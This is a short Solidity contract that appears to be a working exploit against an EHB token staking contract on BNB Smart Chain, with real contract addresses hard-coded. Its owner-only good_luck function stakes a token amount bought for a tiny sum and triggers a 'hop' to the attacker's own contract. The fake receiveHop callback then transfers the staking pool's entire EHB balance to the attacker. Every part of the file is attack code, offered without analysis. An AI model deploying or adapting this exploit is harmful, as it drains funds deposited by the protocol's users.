pragma solidity ^0.8.0;


interface IStaking {
    function enterStaking(uint256 _amt) external;
    function makeHop(IStaking _newPool) external;
    function receiveHop(uint amt, address _addr, address payable oldPool) external;
}

interface IPancakeRouter {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
    returns (uint[] memory amounts);
}

interface IERC20 {
    function approve(address, uint) external returns(bool);

    function transferFrom(address, address, uint) external returns(bool);

    function balanceOf(address) external returns(uint);
}

contract Luck {
    address private owner;
    address private constant EHB_STAKING = 0x63bDBea2Fec57896091019Bbe887a35E6Dc229bd;
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant EHB = 0x80CbA4031F7a75B650f4146E5CebA9d7562DF939;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor() payable {
        owner = msg.sender;
    }

    function good_luck() external onlyOwner {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = EHB;
        IPancakeRouter(PANCAKE_ROUTER).swapExactETHForTokens{value: 1e10}(0, path, address(this), block.timestamp);
        
        uint ehb_amt = IERC20(EHB).balanceOf(address(this));
        IERC20(EHB).approve(EHB_STAKING, ehb_amt);
        IStaking(EHB_STAKING).enterStaking(ehb_amt);
     
        IStaking(EHB_STAKING).makeHop(IStaking(address(this)));
    }

    function receiveHop(uint amt, address _addr, address payable oldPool) external {
        uint amt = IERC20(EHB).balanceOf(EHB_STAKING);
        IERC20(EHB).transferFrom(EHB_STAKING, address(this), amt);
    }

}